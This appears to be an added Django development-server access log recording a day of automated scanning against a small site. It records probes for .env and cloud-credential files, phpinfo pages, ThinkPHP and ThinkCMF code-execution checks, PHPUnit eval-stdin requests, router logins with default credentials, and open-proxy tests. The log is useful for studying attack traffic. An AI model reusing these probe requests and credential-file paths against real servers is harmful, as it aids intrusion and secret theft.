+[25/Jul/2023 04:52:19] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 04:52:19] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 05:03:56] "GET /console/ HTTP/1.1" 404 179
+[25/Jul/2023 05:17:14] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 05:28:19] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 11503
+[25/Jul/2023 05:33:31] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 05:33:31] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 05:47:55] code 400, message Bad request version ('¶')
+[25/Jul/2023 05:47:55] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 06:05:09] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 06:05:09] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 06:05:29] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 06:11:21] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 06:29:10] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 06:32:55] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 11503
+[25/Jul/2023 06:33:06] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 06:33:07] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 06:33:25] "GET /favicon.ico HTTP/1.1" 404 179
+[25/Jul/2023 06:33:26] "GET /1.php HTTP/1.1" 404 179
+[25/Jul/2023 06:33:26] "GET /files/ HTTP/1.1" 404 179
+[25/Jul/2023 06:34:16] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 06:43:45] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 06:43:45,959] - Broken pipe from ('106.9.215.229', 42720)
+[25/Jul/2023 06:48:59] "CONNECT google.com:443 HTTP/1.1" 400 143
+[25/Jul/2023 07:01:40] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 07:02:09] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 07:05:18] "GET /atom.xml HTTP/1.1" 404 179
+[25/Jul/2023 07:05:40] "GET /static/img/image-tda.png HTTP/1.1" 200 69859
+[25/Jul/2023 07:05:40] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 07:08:40] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 179
+[25/Jul/2023 07:25:16] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 07:45:58] code 400, message Bad request version ('À\x14À')
+[25/Jul/2023 07:45:58] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 07:53:40] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 179
+[25/Jul/2023 08:07:01] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 08:18:00] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 08:18:00] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 08:28:38] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 08:28:38,739] - Broken pipe from ('34.140.130.61', 46678)
+[25/Jul/2023 08:36:25] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 08:36:25] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 08:37:52] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179
+[25/Jul/2023 09:12:45] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179
+[25/Jul/2023 09:13:15] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 09:16:33] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x036F¨\x1b+|\x89m\x986¾é\x04¹fÁ\x94\x9f¿Pò¥Þ¹Ðfx\x16`\x8cêJ\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[25/Jul/2023 09:16:33] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 09:32:22] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 09:32:31] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 09:32:31,178] - Broken pipe from ('64.62.197.188', 45423)
+[25/Jul/2023 09:34:25] "GET /favicon.ico HTTP/1.1" 404 179
+[25/Jul/2023 09:35:00] "GET /geoserver/web/ HTTP/1.1" 404 179
+[25/Jul/2023 09:46:33] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00')
+[25/Jul/2023 09:46:33] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 09:54:41] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 09:54:41] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 09:57:42] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 10:04:33] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 10:04:33] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 10:20:22] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 10:32:24] "GET /systembc/password.php HTTP/1.0" 400 143
+[25/Jul/2023 10:53:42] "CONNECT google.com:443 HTTP/1.1" 400 143
+[25/Jul/2023 10:58:52] "CONNECT www.apple.com:443 HTTP/1.1" 400 143
+[25/Jul/2023 11:01:49] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 11:45:45] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 11:45:45] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 11:48:44] code 400, message Bad request version ('À\x14À')
+[25/Jul/2023 11:48:44] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 12:05:31] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 12:27:39] "GET /client/get_targets HTTP/1.1" 404 179
+[25/Jul/2023 12:27:40] "GET /upl.php HTTP/1.1" 404 179
+[25/Jul/2023 12:27:41] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03ë-0-YÂ¯ä\x03ÓGñ$\x9dlV\x0e¥¦þ©]ß3¤·ÈàÊØÄ²\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[25/Jul/2023 12:27:41] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 12:27:41] "GET /geoip/ HTTP/1.1" 404 179
+[25/Jul/2023 12:27:42] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 12:44:39] "GET http://httpbin.org/get HTTP/1.1" 400 143
+[25/Jul/2023 12:44:45] code 400, message Bad request syntax ('\x04\x01\x00P6ÓØh\x00')
+[25/Jul/2023 12:44:45] " P6ÓØh " 400 -
+[25/Jul/2023 12:44:50] code 400, message Bad request syntax ('\x04\x01\x00P6ÓØh\x00')
+[25/Jul/2023 12:44:50] " P6ÓØh " 400 -
+[25/Jul/2023 12:44:57] code 400, message Bad request syntax ('\x05\x01\x00')
+[25/Jul/2023 12:44:57] " " 400 -
+[25/Jul/2023 12:45:02] code 400, message Bad request syntax ('\x05\x01\x00')
+[25/Jul/2023 12:45:02] " " 400 -
+[25/Jul/2023 13:13:04] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 13:13:15] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 13:13:15] "GET /.DS_Store HTTP/1.1" 404 179
+[25/Jul/2023 13:13:15] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:15] "POST /.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:16] "GET /.env.save HTTP/1.1" 404 179
+[25/Jul/2023 13:13:16] "POST /.env.save HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "GET /.env.old HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "POST /.env.old HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "GET /.env.prod HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "POST /.env.prod HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "GET /.env.production HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "POST /.env.production HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "GET /.env.development HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "POST /.env.development HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "GET /laravel/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "POST /laravel/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "GET /admin-app/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "POST /admin-app/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "GET /api/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "POST /api/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "GET /app/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "POST /app/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "GET /development/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "POST /development/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "GET /apps/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "POST /apps/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "GET /cp/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "POST /cp/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:17] "GET /private/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:18] "POST /private/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:18] "GET /system/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:18] "POST /system/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:18] "GET /docker/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:18] "POST /docker/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:18] "GET /cms/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:18] "POST /cms/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:18] "GET /script/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:18] "POST /script/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:18] "GET /live_env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:18] "POST /live_env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:23] "GET /.env.project HTTP/1.1" 404 179
+[25/Jul/2023 13:13:24] "POST /.env.project HTTP/1.1" 404 179
+[25/Jul/2023 13:13:24] "GET /.env.dist HTTP/1.1" 404 179
+[25/Jul/2023 13:13:24] "POST /.env.dist HTTP/1.1" 404 179
+[25/Jul/2023 13:13:25] "GET /back/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:25] "POST /back/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:25] "GET /core/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:25] "POST /core/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:25] "GET /fedex/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:26] "POST /fedex/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:26] "GET /local/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:26] "POST /local/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:26] "GET /rest/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:26] "POST /rest/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:26] "GET /shared/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:26] "POST /shared/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:26] "GET /sources/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:26] "POST /sources/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:26] "GET /enviroments/.env.production HTTP/1.1" 404 179
+[25/Jul/2023 13:13:26] "POST /enviroments/.env.production HTTP/1.1" 404 179
+[25/Jul/2023 13:13:26] "GET /enviroments/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:27] "POST /enviroments/.env HTTP/1.1" 404 179
+[25/Jul/2023 13:13:28] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 13:13:28] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 13:13:28] "GET /frontend_dev.php/$ HTTP/1.1" 404 179
+[25/Jul/2023 13:13:29] "GET /debug/default/view?panel=config/frontend_dev.php HTTP/1.1" 404 179
+[25/Jul/2023 13:13:29] "GET /debug/default/view?panel=config HTTP/1.1" 404 179
+[25/Jul/2023 13:13:29] "GET /debug/default/view.html HTTP/1.1" 404 179
+[25/Jul/2023 13:13:29] "GET /debug/default/view HTTP/1.1" 404 179
+[25/Jul/2023 13:13:29] "GET /frontend/web/debug/default/view HTTP/1.1" 404 179
+[25/Jul/2023 13:13:29] "GET /web/debug/default/view HTTP/1.1" 404 179
+[25/Jul/2023 13:13:29] "GET /sapi/debug/default/view HTTP/1.1" 404 179
+[25/Jul/2023 13:13:29] "GET /config.json HTTP/1.1" 404 179
+[25/Jul/2023 13:13:29] "GET /AwsConfig.json HTTP/1.1" 404 179
+[25/Jul/2023 13:13:29] "GET /awsconfig.json HTTP/1.1" 404 179
+[25/Jul/2023 13:13:31] "GET /aws.json HTTP/1.1" 404 179
+[25/Jul/2023 13:13:31] "GET /conf.json HTTP/1.1" 404 179
+[25/Jul/2023 13:13:31] "GET /env.json HTTP/1.1" 404 179
+[25/Jul/2023 13:13:31] "GET /.vscode/sftp.json HTTP/1.1" 404 179
+[25/Jul/2023 13:13:31] "GET /.json HTTP/1.1" 404 179
+[25/Jul/2023 13:13:31] "GET /smtp.json HTTP/1.1" 404 179
+[25/Jul/2023 13:13:31] "GET /db.json HTTP/1.1" 404 179
+[25/Jul/2023 13:13:31] "GET /sendgrid.json HTTP/1.1" 404 179
+[25/Jul/2023 13:13:31] "GET /sftp-settings.json HTTP/1.1" 404 179
+[25/Jul/2023 13:13:31] "GET /_profiler/phpinfo HTTP/1.1" 404 179
+[25/Jul/2023 13:13:31] "GET /phpinfo.php HTTP/1.1" 404 179
+[25/Jul/2023 13:13:31] "GET /info.php HTTP/1.1" 404 179
+[25/Jul/2023 13:13:32] "GET /?phpinfo=1 HTTP/1.1" 200 11503
+[25/Jul/2023 13:13:32] "GET /tool/view/phpinfo.view.php HTTP/1.1" 404 179
+[25/Jul/2023 13:13:32] "GET /phpinfo HTTP/1.1" 404 179
+[25/Jul/2023 13:13:32] "GET /symfony/public/_profiler/phpinfo HTTP/1.1" 404 179
+[25/Jul/2023 13:13:32] "GET /html/phpinfo.php HTTP/1.1" 404 179
+[25/Jul/2023 13:13:32] "GET /?phpinfo=-1 HTTP/1.1" 200 11503
+[25/Jul/2023 13:13:33] "GET /__info.php HTTP/1.1" 404 179
+[25/Jul/2023 13:13:33] "GET /_info-backoffice.php HTTP/1.1" 404 179
+[25/Jul/2023 13:13:33] "GET /_info.php HTTP/1.1" 404 179
+[25/Jul/2023 13:13:33] "GET /_phpinf.php HTTP/1.1" 404 179
+[25/Jul/2023 13:13:33] "GET /_phpinfo.php HTTP/1.1" 404 179
+[25/Jul/2023 13:13:33] "GET /_poopinfo.php HTTP/1.1" 404 179
+[25/Jul/2023 13:13:33] "GET /.__info.php HTTP/1.1" 404 179
+[25/Jul/2023 13:13:33] "GET /.info.php HTTP/1.1" 404 179
+[25/Jul/2023 13:13:33] "GET /0.0_phpinfo.php HTTP/1.1" 404 179
+[25/Jul/2023 13:13:33] "GET /00_server_info.php HTTP/1.1" 404 179
+[25/Jul/2023 13:13:33] "GET /02-info.php HTTP/1.1" 404 179
+[25/Jul/2023 13:13:33] "GET /1_1_PhpInfo.php HTTP/1.1" 404 179
+[25/Jul/2023 13:13:33] "GET /5info.php HTTP/1.1" 404 179
+[25/Jul/2023 13:13:33] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 13:13:33] "GET /api/index.php/v1/config/application?public=true HTTP/1.1" 404 179
+[25/Jul/2023 13:50:17] code 400, message Bad request version ('À\x14À')
+[25/Jul/2023 13:50:17] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 14:08:30] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 14:08:31] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 14:08:31] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 14:16:19] "GET /y000000000044.cfg HTTP/1.1" 404 179
+[25/Jul/2023 14:18:17] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 14:21:05] "GET /y000000000000.cfg HTTP/1.1" 404 179
+[25/Jul/2023 14:29:09] "GET /y000000000031.cfg HTTP/1.1" 404 179
+[25/Jul/2023 14:33:58] "GET / HTTP/1.1" 400 143
+[25/Jul/2023 14:48:07] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 14:48:08] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 14:55:00] "GET /vpn/themes/insight-new-min.js HTTP/1.1" 404 179
+[25/Jul/2023 15:19:47] "GET /?act=cl&ofid=9999999&uid=1&vid=1&lid=1&cid=1&pid=1_mt HTTP/1.1" 200 11503
+[25/Jul/2023 15:46:30] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 15:46:30] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 15:48:16] code 400, message Bad request version ('À\x14À')
+[25/Jul/2023 15:48:16] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 16:12:57] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 16:12:57] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 16:13:44] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 16:41:03] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 16:41:03] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 16:59:55] code 400, message Bad request syntax ('\x05\x01\x00')
+[25/Jul/2023 16:59:55] " " 400 -
+[25/Jul/2023 17:00:00] code 400, message Bad request syntax ('\x05\x01\x00')
+[25/Jul/2023 17:00:00] " " 400 -
+[25/Jul/2023 17:00:07] code 400, message Bad request syntax ('\x05\x01\x00')
+[25/Jul/2023 17:00:07] " " 400 -
+[25/Jul/2023 17:01:20] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+[25/Jul/2023 17:01:20] " P¼Òã " 400 -
+[25/Jul/2023 17:01:27] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+[25/Jul/2023 17:01:27] " P¼Òã " 400 -
+[25/Jul/2023 17:01:32] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+[25/Jul/2023 17:01:32] " P¼Òã " 400 -
+[25/Jul/2023 17:02:32] "GET http://5.188.210.227/echo.php HTTP/1.1" 400 143
+[25/Jul/2023 17:06:30] "GET / HTTP/1.0" 200 11503
+[25/Jul/2023 17:10:55] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 17:10:55] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 17:17:43] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 17:24:35] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 17:24:35] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 17:36:25] code 400, message Bad request version ('\x00/\x00')
+[25/Jul/2023 17:36:25] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 17:36:26] "GET /z5y4 HTTP/1.1" 404 179
+[25/Jul/2023 17:36:26] "GET /9fXf HTTP/1.1" 404 179
+[25/Jul/2023 17:47:25] code 400, message Bad request version ('À\x14À')
+[25/Jul/2023 17:47:25] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 17:59:34] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 18:16:57] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 18:16:57] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 18:19:44] code 400, message Bad request version ('À\x14À')
+[25/Jul/2023 18:19:44] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 18:19:45] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 18:27:36] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 18:39:00] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 18:39:00] code 505, message Invalid HTTP version (2.0)
+[25/Jul/2023 18:39:00] "PRI * HTTP/2.0" 505 -
+[25/Jul/2023 18:39:00] "GET /static/img/image-tda.png HTTP/1.1" 200 69859
+[25/Jul/2023 18:39:01] "GET /favicon.ico HTTP/1.1" 404 179
+[25/Jul/2023 18:46:00] "POST /boaform/admin/formLogin HTTP/1.1" 404 179
+[25/Jul/2023 18:46:26] "GET / HTTP/1.1" 400 143
+[25/Jul/2023 18:52:09] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 18:52:09] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 18:58:39] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 19:12:18] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 19:33:00] "GET /portal/redlion HTTP/1.1" 404 179
+[25/Jul/2023 19:33:53] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 19:33:53,410] - Broken pipe from ('34.77.127.183', 51376)
+[25/Jul/2023 19:45:51] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 19:48:59] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00')
+[25/Jul/2023 19:48:59] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 20:10:50] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 20:38:12] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 20:38:13] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 20:57:01] "POST /boaform/admin/formLogin HTTP/1.1" 404 179
+[25/Jul/2023 21:16:45] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 21:18:03] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 21:22:53] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 21:22:53] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 21:31:00] code 400, message Bad request syntax ('MGLNDD_147.182.184.6_80')
+[25/Jul/2023 21:31:00] "MGLNDD_147.182.184.6_80" 400 -
+[25/Jul/2023 21:33:19] "POST / HTTP/1.1" 400 143
+[25/Jul/2023 21:42:17] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 21:43:10] "                    GET / HTTP/1.0" 400 143
+[25/Jul/2023 21:43:12] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 400 143
+[25/Jul/2023 21:43:36] code 400, message Bad request version ('À\x14À')
+[25/Jul/2023 21:43:36] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 21:44:08] code 400, message Bad request version ('À\x14À')
+[25/Jul/2023 21:44:08] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 21:44:16] "GET /favicon.ico HTTP/1.1" 404 179
+[25/Jul/2023 21:44:31] code 400, message Bad request version ('À\x14À')
+[25/Jul/2023 21:44:31] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 21:44:38] "GET /manage/account/login HTTP/1.1" 404 179
+[25/Jul/2023 21:45:00] code 400, message Bad request version ('À\x14À')
+[25/Jul/2023 21:45:00] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 21:45:08] "GET /admin/index.html HTTP/1.1" 302 0
+[25/Jul/2023 21:45:30] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x11¶@<¸Y"\x88ýTv-\x08inUQ?è¯\x01\x91ÏMfé\x14üÃ¨\x16q\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[25/Jul/2023 21:45:30] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 21:45:38] "GET /index.html HTTP/1.1" 404 179
+[25/Jul/2023 21:46:02] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Ý%nVÙáû\x9fk»×c5w\x8a×9)â\x18´ûÝ£ö\x11S¯\x1b\x94¤x\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[25/Jul/2023 21:46:02] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 21:46:10] "GET /+CSCOE+/logon.html HTTP/1.1" 404 179
+[25/Jul/2023 21:46:34] code 400, message Bad request syntax ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03ÔgÉ±¢u[Ü-A®0õ~<R\x8cY\x1bÜn»Sv±|\x11')
+[25/Jul/2023 21:46:34] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 21:46:41] "GET /cgi-bin/login.cgi HTTP/1.1" 404 179
+[25/Jul/2023 21:47:03] code 400, message Bad request version ('À\x14À')
+[25/Jul/2023 21:47:03] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 21:47:12] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 21:49:35] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00')
+[25/Jul/2023 21:49:35] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 22:13:00] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 22:13:00] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 22:14:20] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 22:24:30] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 22:24:41] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 22:53:26] "POST /boaform/admin/formLogin HTTP/1.1" 404 179
+[25/Jul/2023 22:55:28] "GET /backend/.env HTTP/1.1" 404 179
+[25/Jul/2023 22:55:29] "POST /backend HTTP/1.1" 404 179
+[25/Jul/2023 23:09:18] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 23:13:32] "GET /api/.env HTTP/1.1" 404 179
+[25/Jul/2023 23:13:32] "POST /api HTTP/1.1" 404 179
+[25/Jul/2023 23:17:36] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 23:17:36] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 23:23:49] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 23:39:21] "GET / HTTP/1.0" 400 143
+[25/Jul/2023 23:43:25] "POST / HTTP/1.1" 403 1444
+[25/Jul/2023 23:43:25] "GET /.env HTTP/1.1" 404 179
+[25/Jul/2023 23:44:39] "GET /laravel/.env HTTP/1.1" 404 179
+[25/Jul/2023 23:44:39] "POST /laravel HTTP/1.1" 404 179
+[25/Jul/2023 23:45:19] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 23:46:11] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 23:46:46] code 400, message Bad request version ('À\x14À')
+[25/Jul/2023 23:46:46] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 23:59:54] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 00:22:10] "CONNECT google.com:443 HTTP/1.1" 400 143
+[26/Jul/2023 01:15:02] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 01:53:53] code 400, message Bad request version ('À\x14À')
+[26/Jul/2023 01:53:53] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 01:54:37] "GET http://ip-api.com/json HTTP/1.1" 400 143
+[26/Jul/2023 02:06:14] code 400, message Bad request version ('À\x14À')
+[26/Jul/2023 02:06:14] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 02:19:40] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 02:19:51] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 02:20:05] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 02:20:06] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 02:34:13] "GET / HTTP/1.0" 200 11503
+[26/Jul/2023 02:43:32] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 02:43:32] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 02:51:55] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 02:51:56] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 02:52:34] "POST /boaform/admin/formLogin HTTP/1.1" 404 179
+[26/Jul/2023 02:57:01] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 03:37:09] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 03:37:09] "GET /static/css/main.css HTTP/1.1" 304 0
+[26/Jul/2023 03:37:09] "GET /static/img/image-tda.png HTTP/1.1" 304 0
+[26/Jul/2023 03:37:10] "GET /static/img/camion-1.jpeg HTTP/1.1" 304 0
+[26/Jul/2023 03:37:10] "GET /static/img/camion-2.jpg HTTP/1.1" 304 0
+[26/Jul/2023 03:37:10] "GET /static/img/background.jpg HTTP/1.1" 304 0
+[26/Jul/2023 03:37:10] "GET /static/img/banner.jpg HTTP/1.1" 304 0
+[26/Jul/2023 03:55:41] code 400, message Bad request version ('À\x14À')
+[26/Jul/2023 03:55:41] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 03:56:58] "POST / HTTP/1.1" 403 1444
+[26/Jul/2023 03:56:58] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 04:01:32] code 400, message Bad request version ('À(À$À\x14À')
+[26/Jul/2023 04:01:32] You're accessing the development server over HTTPS, but it only supports HTTP.
+[26/Jul/2023 04:23:04] "GET / HTTP/1.1" 200 11503
+[26/Jul/2023 04:26:12] "GET /.env HTTP/1.1" 404 179
+[26/Jul/2023 04:26:12] "POST / HTTP/1.1" 403 1444
